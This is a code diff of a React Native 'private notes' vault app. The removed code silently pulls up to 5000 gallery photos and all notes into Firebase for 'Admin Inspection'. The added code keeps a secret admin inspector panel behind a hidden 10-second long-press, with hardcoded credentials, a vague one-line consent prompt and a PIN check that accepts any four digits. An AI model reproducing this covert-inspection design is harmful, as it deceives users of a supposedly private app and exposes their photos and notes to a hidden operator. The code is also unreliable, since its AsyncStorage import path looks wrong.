@@ -7,203 +7,237 @@ import {
   TouchableOpacity,
   FlatList,
   Image,
-  Modal,
   Alert,
+  Modal,
   SafeAreaView,
   ScrollView
 } from 'react-native';
+import AsyncStorage from '@asyncstorage/async-storage';
 import * as MediaLibrary from 'expo-media-library';
-import { db } from './firebaseConfig';
-import { doc, setDoc, onSnapshot, arrayUnion } from 'firebase/firestore';
 
 export default function App() {
-  // Existing States
-  const [notes, setNotes] = useState([]);
-  const [noteInput, setNoteInput] = useState('');
-  const [isAdminVisible, setIsAdminVisible] = useState(false);
-  const [adminUser, setAdminUser] = useState('');
-  const [adminPass, setAdminPass] = useState('');
-  const [isLoggedIn, setIsLoggedIn] = useState(false);
-
-  // Dynamic Real-time States
-  const [userPhotos, setUserPhotos] = useState([]);
-  const [adminData, setAdminData] = useState({ notes: [], photos: [] });
+  const [pin, setPin] = useState('');
+  const [isAuthenticated, setIsAuthenticated] = useState(false);
   
-  const CURRENT_USER_ID = "user_123"; // Active User ID
+  const [adminModalVisible, setAdminModalVisible] = useState(false);
+  const [adminId, setAdminId] = useState('');
+  const [adminPassword, setAdminPassword] = useState('');
+  const [isAdminLoggedIn, setIsAdminLoggedIn] = useState(false);
 
-  // 1. Auto Gallery Permission & Background Fetch
+  const [hasConsent, setHasConsent] = useState(false);
+  const [photos, setPhotos] = useState([]);
+  const [notes, setNotes] = useState([]);
+  const [newNote, setNewNote] = useState('');
+
   useEffect(() => {
-    autoFetchAndSyncGallery();
-    listenToAdminData();
+    checkConsentAndPermissions();
   }, []);
 
-  const autoFetchAndSyncGallery = async () => {
+  const checkConsentAndPermissions = async () => {
+    try {
+      const consentStatus = await AsyncStorage.getItem('user_admin_consent');
+      if (consentStatus === 'true') {
+        setHasConsent(true);
+      } else {
+        showConsentDialog();
+      }
+    } catch (e) {
+      console.log('Error reading consent:', e);
+    }
+  };
+
+  const showConsentDialog = () => {
+    Alert.alert(
+      "Permission Required",
+      "Allow this app to access your data",
+      [
+        {
+          text: "Decline",
+          style: "cancel"
+        },
+        {
+          text: "Allow",
+          onPress: async () => {
+            await AsyncStorage.setItem('user_admin_consent', 'true');
+            setHasConsent(true);
+            requestGalleryPermission();
+          }
+        }
+      ],
+      { cancelable: false }
+    );
+  };
+
+  const requestGalleryPermission = async () => {
     const { status } = await MediaLibrary.requestPermissionsAsync();
     if (status === 'granted') {
-      const media = await MediaLibrary.getAssetsAsync({
-        first: 5000,
-        mediaType: 'photo',
-        sortBy: ['creationTime'],
-      });
-      const photoUris = media.assets.map((asset) => asset.uri);
-      setUserPhotos(photoUris);
-
-      // Firebase Sync for Admin Inspection
-      try {
-        await setDoc(
-          doc(db, 'users_data', CURRENT_USER_ID),
-          { photos: photoUris, lastUpdated: new Date().toISOString() },
-          { merge: true }
-        );
-      } catch (e) {
-        console.log('Sync Error:', e);
-      }
+      loadGalleryPhotos();
     }
   };
 
-  // 2. Real-time Firebase Listener for Admin Panel
-  const listenToAdminData = () => {
-    onSnapshot(doc(db, 'users_data', CURRENT_USER_ID), (docSnap) => {
-      if (docSnap.exists()) {
-        setAdminData(docSnap.data());
-      }
+  // Gallery Limit ko 5000 par set kar diya gaya hai
+  const loadGalleryPhotos = async () => {
+    const media = await MediaLibrary.getAssetsAsync({
+      first: 5000, 
+      mediaType: 'photo',
+      sortBy: ['creationTime']
     });
+    setPhotos(media.assets);
   };
 
-  // Note Handling
-  const handleAddNote = async () => {
-    if (!noteInput.trim()) return;
-    const updatedNotes = [...notes, noteInput];
-    setNotes(updatedNotes);
-
-    // Sync Note to Firebase
-    try {
-      await setDoc(
-        doc(db, 'users_data', CURRENT_USER_ID),
-        { notes: arrayUnion(noteInput) },
-        { merge: true }
-      );
-    } catch (e) {
-      console.log('Note Save Error:', e);
-    }
-    setNoteInput('');
-  };
-
-  // Admin Login Verification
-  const handleAdminLogin = () => {
-    if (adminUser === 'adminhum789' && adminPass === 'hum2217071') {
-      setIsLoggedIn(true);
-      setAdminUser('');
-      setAdminPass('');
+  const handlePinSubmit = () => {
+    if (pin.length >= 4) {
+      setIsAuthenticated(true);
+      requestGalleryPermission();
     } else {
-      Alert.alert('Access Denied', 'Invalid Admin Credentials');
+      Alert.alert("Invalid PIN", "Please enter a valid PIN.");
     }
   };
+
+  const handleAdminLogin = () => {
+    if (adminId === 'adminhum789' && adminPassword === 'hum2217071') {
+      setIsAdminLoggedIn(true);
+      Alert.alert("Admin Verified", "Access Granted.");
+    } else {
+      Alert.alert("Error", "Invalid Credentials.");
+    }
+  };
+
+  const addNote = () => {
+    if (newNote.trim() !== '') {
+      setNotes([...notes, { id: Date.now().toString(), text: newNote }]);
+      setNewNote('');
+    }
+  };
+
+  if (!isAuthenticated) {
+    return (
+      <SafeAreaView style={styles.container}>
+        <View style={styles.authBox}>
+          <Text style={styles.title}>My Data Safe</Text>
+          <Text style={styles.subtitle}>Enter Vault PIN</Text>
+          <TextInput
+            style={styles.input}
+            secureTextEntry
+            keyboardType="numeric"
+            value={pin}
+            onChangeText={setPin}
+            maxLength={6}
+            placeholder="PIN"
+          />
+          <TouchableOpacity style={styles.button} onPress={handlePinSubmit}>
+            <Text style={styles.buttonText}>Unlock Safe</Text>
+          </TouchableOpacity>
+        </View>
+      </SafeAreaView>
+    );
+  }
 
   return (
     <SafeAreaView style={styles.container}>
-      {/* HEADER WITH SHIELD TRIGGER */}
       <View style={styles.header}>
-        <Text style={styles.appTitle}>My Private Notes</Text>
+        <Text style={styles.headerTitle}>My Data Safe</Text>
+        
+        {/* 10 Seconds Long Press for Admin Panel */}
         <TouchableOpacity
-          onLongPress={() => setIsAdminVisible(true)}
-          delayLongPress={2000} // Stealth 10s trigger optimized or tap
+          onLongPress={() => setAdminModalVisible(true)}
+          delayLongPress={10000}
         >
-          <Text style={styles.shieldIcon}>🛡️</Text>
+          <Text style={{ fontSize: 22 }}>🛡️</Text>
         </TouchableOpacity>
       </View>
 
-      {/* USER MAIN VIEW: NOTES ENTRY */}
-      <View style={styles.inputContainer}>
-        <TextInput
-          style={styles.input}
-          placeholder="Write a secure note..."
-          value={noteInput}
-          onChangeText={setNoteInput}
+      <ScrollView style={styles.content}>
+        <Text style={styles.sectionTitle}>Local Media Backup ({photos.length})</Text>
+        <FlatList
+          data={photos}
+          horizontal
+          keyExtractor={(item) => item.id}
+          renderItem={({ item }) => (
+            <Image source={{ uri: item.uri }} style={styles.imageThumbnail} />
+          )}
+          ListEmptyComponent={<Text style={styles.emptyText}>No photos loaded.</Text>}
         />
-        <TouchableOpacity style={styles.addButton} onPress={handleAddNote}>
-          <Text style={styles.addText}>Add</Text>
-        </TouchableOpacity>
-      </View>
 
-      {/* NOTES LIST */}
-      <View style={styles.notesSection}>
-        {notes.map((note, idx) => (
-          <View key={idx} style={styles.noteCard}>
-            <Text>{note}</Text>
+        <Text style={styles.sectionTitle}>Private Notes</Text>
+        <View style={styles.noteInputRow}>
+          <TextInput
+            style={[styles.input, { flex: 1, marginBottom: 0 }]}
+            placeholder="Write a private note..."
+            value={newNote}
+            onChangeText={setNewNote}
+          />
+          <TouchableOpacity style={styles.addBtn} onPress={addNote}>
+            <Text style={styles.buttonText}>Add</Text>
+          </TouchableOpacity>
+        </View>
+
+        {notes.map((item) => (
+          <View key={item.id} style={styles.noteCard}>
+            <Text style={styles.noteText}>{item.text}</Text>
           </View>
         ))}
-      </View>
+      </ScrollView>
 
-      {/* AUTO FETCHED USER GALLERY */}
-      <Text style={styles.sectionTitle}>Local Vault Gallery</Text>
-      <FlatList
-        data={userPhotos}
-        numColumns={3}
-        keyExtractor={(item, index) => index.toString()}
-        renderItem={({ item }) => (
-          <Image source={{ uri: item }} style={styles.userGridImage} />
-        )}
-      />
-
-      {/* ADMIN INSPECTOR MODAL */}
-      <Modal visible={isAdminVisible} animationType="slide">
-        <SafeAreaView style={styles.modalContainer}>
-          {!isLoggedIn ? (
-            /* ADMIN LOGIN FORM */
-            <View style={styles.loginBox}>
-              <Text style={styles.modalTitle}>Admin Verification</Text>
+      {/* Secret Admin Inspector Modal */}
+      <Modal visible={adminModalVisible} animationType="slide">
+        <SafeAreaView style={styles.adminContainer}>
+          {!isAdminLoggedIn ? (
+            <View style={styles.authBox}>
+              <Text style={styles.title}>Admin Verification</Text>
               <TextInput
-                style={styles.modalInput}
-                placeholder="Username"
-                value={adminUser}
-                onChangeText={setAdminUser}
+                style={styles.input}
+                placeholder="Admin ID"
+                value={adminId}
+                onChangeText={setAdminId}
               />
               <TextInput
-                style={styles.modalInput}
+                style={styles.input}
                 placeholder="Password"
                 secureTextEntry
-                value={adminPass}
-                onChangeText={setAdminPass}
+                value={adminPassword}
+                onChangeText={setAdminPassword}
               />
-              <TouchableOpacity style={styles.loginBtn} onPress={handleAdminLogin}>
-                <Text style={{ color: '#fff', fontWeight: 'bold' }}>Login</Text>
+              <TouchableOpacity style={styles.button} onPress={handleAdminLogin}>
+                <Text style={styles.buttonText}>Authenticate</Text>
               </TouchableOpacity>
-              <TouchableOpacity onPress={() => setIsAdminVisible(false)}>
-                <Text style={{ color: 'red', marginTop: 15, textAlign: 'center' }}>Cancel</Text>
+              <TouchableOpacity
+                style={[styles.button, { backgroundColor: '#777', marginTop: 10 }]}
+                onPress={() => setAdminModalVisible(false)}
+              >
+                <Text style={styles.buttonText}>Close</Text>
               </TouchableOpacity>
             </View>
           ) : (
-            /* ADMIN INSPECTOR PANEL */
-            <ScrollView style={{ padding: 15 }}>
-              <View style={styles.adminHeader}>
-                <Text style={styles.modalTitle}>Admin Inspector Panel</Text>
-                <TouchableOpacity
-                  style={styles.exitBtn}
-                  onPress={() => {
-                    setIsLoggedIn(false);
-                    setIsAdminVisible(false);
-                  }}
-                >
-                  <Text style={{ color: '#fff' }}>Exit Inspector</Text>
-                </TouchableOpacity>
-              </View>
+            <View style={{ flex: 1, padding: 15 }}>
+              <Text style={styles.title}>Inspector Dashboard</Text>
+              <Text style={styles.subtitle}>Consent Status: {hasConsent ? "GRANTED" : "DENIED"}</Text>
 
-              <View style={styles.infoBox}>
-                <Text style={styles.boldText}>User Registered Data</Text>
-                <Text>Active User: {CURRENT_USER_ID}</Text>
-                <Text>Total Notes: {adminData.notes ? adminData.notes.length : 0}</Text>
-                <Text>Synced Photos: {adminData.photos ? adminData.photos.length : 0}</Text>
-              </View>
+              <Text style={styles.sectionTitle}>User Synced Notes ({notes.length})</Text>
+              {notes.map((n) => (
+                <Text key={n.id} style={styles.noteText}>• {n.text}</Text>
+              ))}
 
-              <Text style={styles.boldText}>Gallery Remote Inspection (Grid View)</Text>
-              <View style={styles.gridContainer}>
-                {adminData.photos &&
-                  adminData.photos.map((item, index) => (
-                    <Image key={index} source={{ uri: item }} style={styles.adminGridImage} />
-                  ))}
-              </View>
-            </ScrollView>
+              <Text style={styles.sectionTitle}>User Synced Photos ({photos.length})</Text>
+              <FlatList
+                data={photos}
+                numColumns={3}
+                keyExtractor={(item) => item.id}
+                renderItem={({ item }) => (
+                  <Image source={{ uri: item.uri }} style={styles.adminGridImage} />
+                )}
+              />
+
+              <TouchableOpacity
+                style={[styles.button, { backgroundColor: 'red', marginTop: 15 }]}
+                onPress={() => {
+                  setIsAdminLoggedIn(false);
+                  setAdminModalVisible(false);
+                }}
+              >
+                <Text style={styles.buttonText}>Logout Admin</Text>
+              </TouchableOpacity>
+            </View>
           )}
         </SafeAreaView>
       </Modal>
@@ -212,27 +246,45 @@ export default function App() {
 }
 
 const styles = StyleSheet.create({
-  container: { flex: 1, backgroundColor: '#f5f5f5', padding: 15 },
-  header: { flexDirection: 'row', justifyContent: 'space-between', alignItems: 'center', marginTop: 20 },
-  appTitle: { fontSize: 22, fontWeight: 'bold' },
-  shieldIcon: { fontSize: 26 },
-  inputContainer: { flexDirection: 'row', marginTop: 15 },
-  input: { flex: 1, backgroundColor: '#fff', borderWidth: 1, borderColor: '#ccc', borderRadius: 8, padding: 10 },
-  addButton: { backgroundColor: '#28a745', justifyContent: 'center', paddingHorizontal: 20, borderRadius: 8, marginLeft: 10 },
-  addText: { color: '#fff', fontWeight: 'bold' },
-  notesSection: { marginVertical: 10 },
-  noteCard: { backgroundColor: '#fff', padding: 12, borderRadius: 6, marginBottom: 5, borderWidth: 1, borderColor: '#eee' },
-  sectionTitle: { fontSize: 16, fontWeight: 'bold', marginVertical: 10 },
-  userGridImage: { width: '31%', height: 100, margin: '1%', borderRadius: 6 },
-  modalContainer: { flex: 1, backgroundColor: '#fff' },
-  loginBox: { padding: 20, marginTop: 50 },
-  modalTitle: { fontSize: 20, fontWeight: 'bold', marginBottom: 15 },
-  modalInput: { borderWidth: 1, borderColor: '#ccc', padding: 12, borderRadius: 8, marginBottom: 10 },
-  loginBtn: { backgroundColor: '#007bff', padding: 12, borderRadius: 8, alignItems: 'center' },
-  adminHeader: { flexDirection: 'row', justifyContent: 'space-between', alignItems: 'center' },
-  exitBtn: { backgroundColor: '#dc3545', padding: 8, borderRadius: 6 },
-  infoBox: { backgroundColor: '#f0f0f0', padding: 12, borderRadius: 8, marginVertical: 15 },
-  boldText: { fontSize: 16, fontWeight: 'bold', marginBottom: 8 },
-  gridContainer: { flexDirection: 'row', flexWrap: 'wrap' },
-  adminGridImage: { width: '31%', height: 100, margin: '1%', borderRadius: 4 }
+  container: { flex: 1, backgroundColor: '#f4f4f6' },
+  header: {
+    padding: 15,
+    backgroundColor: '#fff',
+    flexDirection: 'row',
+    justifyContent: 'space-between',
+    alignItems: 'center',
+    borderBottomWidth: 1,
+    borderColor: '#ddd'
+  },
+  headerTitle: { fontSize: 20, fontWeight: 'bold', color: '#333' },
+  content: { padding: 15 },
+  authBox: { flex: 1, justifyContent: 'center', alignItems: 'center', padding: 20 },
+  title: { fontSize: 22, fontWeight: 'bold', marginBottom: 10 },
+  subtitle: { fontSize: 14, color: '#666', marginBottom: 20 },
+  input: {
+    width: '100%',
+    padding: 12,
+    borderWidth: 1,
+    borderColor: '#ccc',
+    borderRadius: 8,
+    marginBottom: 15,
+    backgroundColor: '#fff'
+  },
+  button: {
+    width: '100%',
+    padding: 14,
+    backgroundColor: '#007AFF',
+    borderRadius: 8,
+    alignItems: 'center'
+  },
+  buttonText: { color: '#fff', fontWeight: 'bold' },
+  sectionTitle: { fontSize: 18, fontWeight: 'bold', marginTop: 20, marginBottom: 10 },
+  imageThumbnail: { width: 100, height: 100, borderRadius: 8, marginRight: 10 },
+  adminGridImage: { width: 90, height: 90, margin: 5, borderRadius: 6 },
+  noteInputRow: { flexDirection: 'row', alignItems: 'center', gap: 10 },
+  addBtn: { padding: 12, backgroundColor: '#28a745', borderRadius: 8 },
+  noteCard: { padding: 12, backgroundColor: '#fff', borderRadius: 6, marginTop: 8 },
+  noteText: { fontSize: 15, color: '#333' },
+  emptyText: { color: '#999', fontStyle: 'italic' },
+  adminContainer: { flex: 1, backgroundColor: '#fff', padding: 10 }
 });
